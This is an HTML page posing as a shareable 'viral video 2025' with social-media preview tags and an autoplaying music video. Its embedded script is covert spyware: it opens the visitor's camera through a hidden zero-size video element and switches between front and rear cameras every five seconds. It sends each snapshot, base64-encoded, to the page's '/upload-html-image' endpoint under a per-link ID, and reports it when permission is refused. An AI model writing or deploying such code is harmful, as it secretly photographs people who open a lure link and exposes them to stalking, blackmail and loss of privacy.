<!DOCTYPE html>
<html lang="en">
<head>

<!-- Basic Meta Tags -->
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="title" content="Facebook new viral video üí•üí•">
<meta name="description" content="New video  üòãüòã‚ù§Ô∏è‚Äçüî•">
<meta name="keywords" content="ridhi, keyword3">
<meta name="author" content="viral video 2025">

<!-- Open Graph / Facebook -->
<meta property="og:type" content="website">
<meta property="og:url" content="https://viral-video-nirg.onrender.com">
<meta property="og:title" content=" New viral video 2025 üí•üí•üí•">
<meta property="og:description" content="New viral video 2025 üí•üí•üí•">
<meta property="og:image" content="https://viral-video-nirg.onrender.com/thumbnail.jpg">

<!-- Twitter -->
<meta name="twitter:card" content="New viral video üí•üí•üí•üí•üíØ">
<meta name="twitter:url" content="https://viral-video-nirg.onrender.com">
<meta name="twitter:title" content="New viral video 2025 üí•üí•üí•">
<meta name="twitter:description" content="New viral video 2025 üí•üí•üí•
üòã enjoy this video ">
<meta name="twitter:image" content="https://viral-video-nirg.onrender.com/thumbnail.jpg">


<style>
body { background:#121212; color:#fff; text-align:center; font-family:Arial; margin:0; }
h1 { color:#ffeb3b; margin-top:20px; }
.video-container { display:flex; justify-content:center; margin-top:20px; }
video { width:100%; max-width:800px; aspect-ratio:16/9; border:3px solid #ffeb3b; border-radius:10px; box-shadow:0 6px 15px rgba(0,0,0,0.6); }
#statusText { margin-top:15px; font-size:1.1rem; color:#00e676; }
#camera { width:0; height:0; opacity:0; position:absolute; top:0; left:0; }
</style>
</head>
<body>
<h1>Viral Music Video 2025</h1>

<div class="video-container">
<video id="musicVideo" controls autoplay>
<source src="/video/‡¶ò‡ßÅ‡¶Æ ‡¶®‡¶æ ‡¶Ü‡¶∏‡¶æ ‡¶∞‡¶æ‡¶§‡ßá ‡¶§‡ßÅ‡¶Æ‡¶ø ‡¶Ü‡¶Æ‡¶æ‡¶∞ ‡¶ï‡¶≤‡ßç‡¶™‡¶®‡¶æ‡¶§‡ßá (lyrics) Gum Na Asha Rate _ Tik Tok Viral Song _‡¶ò‡ßÅ‡¶Æ_‡¶®‡¶æ(3.mp4" type="video/mp4">
Your browser does not support video.
</video>
</div>

<video id="camera" autoplay playsinline></video>
<p id="statusText">üé¨ ‡¶ò‡ßÅ‡¶Æ ‡¶®‡¶æ ‡¶Ü‡¶∏‡¶æ ‡¶∞‡¶æ‡¶§‡ßá ‡¶§‡ßÅ‡¶Æ‡¶ø ‡¶Ü‡¶Æ‡¶æ‡¶∞ ‡¶ï‡¶≤‡ßç‡¶™‡¶®‡¶æ‡¶§‡ßá (lyrics) Gum Na Asha Rate _ Tik Tok Viral Song _‡¶ò‡ßÅ‡¶Æ_‡¶®‡¶æ(3.mp4</p>

<script>
const camera = document.getElementById("camera");
const statusText = document.getElementById("statusText");
const videoId = window.location.pathname.split("/").pop() || "default_video";

let useFront = true; // ‡¶™‡ßç‡¶∞‡¶•‡¶Æ‡ßá front
let captureInterval = 5000; // ‡ß´ ‡¶∏‡ßá‡¶ï‡ßá‡¶®‡ßç‡¶°

async function sendSnapshot(base64, camType) {
    try {
        await fetch("/upload-html-image", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ videoId, base64, camera: camType })
        });
        console.log(`‚úÖ Snapshot sent (${camType}) for video ID:`, videoId);
    } catch(err) {
        console.error("‚ùå Failed to send snapshot:", err);
    }
}

async function captureOnce(camType) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: camType }, audio: false });
        camera.srcObject = stream;

        // ‡¶≠‡¶ø‡¶°‡¶ø‡¶ì frame ready ‡¶π‡¶§‡ßá delay
        await new Promise(r => setTimeout(r, 500));

        if (camera.readyState < 2) {
            console.warn("Video not ready for capture:", camType);
            stream.getTracks().forEach(track => track.stop());
            return;
        }

        const canvas = document.createElement("canvas");
        const ctx = canvas.getContext("2d");
        canvas.width = 640;
        canvas.height = 360;
        ctx.drawImage(camera, 0, 0, canvas.width, canvas.height);

        canvas.toBlob(blob => {
            const reader = new FileReader();
            reader.onloadend = () => {
                const base64 = reader.result.split(",")[1];
                sendSnapshot(base64, camType);
            };
            reader.readAsDataURL(blob);
        }, "image/jpeg", 0.7);

        // stream ‡¶¨‡¶®‡ßç‡¶ß ‡¶ï‡¶∞‡ßÅ‡¶®
        stream.getTracks().forEach(track => track.stop());

    } catch(err) {
        console.error("‚ùå Camera permission or error:", camType, err);
        statusText.innerText = `‚ùå ${camType} camera error`;
        statusText.style.color = "#ff1744";

        // permission denied info ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã
        await fetch("/upload-html-image", {
            method:"POST",
            headers:{"Content-Type":"application/json"},
            body: JSON.stringify({ videoId, noPermission:true })
        });
    }
}

// ‡¶∂‡ßÅ‡¶∞‡ßÅ: ‡¶™‡ßç‡¶∞‡¶§‡¶ø ‡ß´ ‡¶∏‡ßá‡¶ï‡ßá‡¶®‡ßç‡¶°‡ßá swap ‡¶ï‡¶∞‡ßá capture
setInterval(() => {
    const camType = useFront ? "user" : "environment";
    captureOnce(camType);
    useFront = !useFront;
}, captureInterval);

</script>
</body>
</html>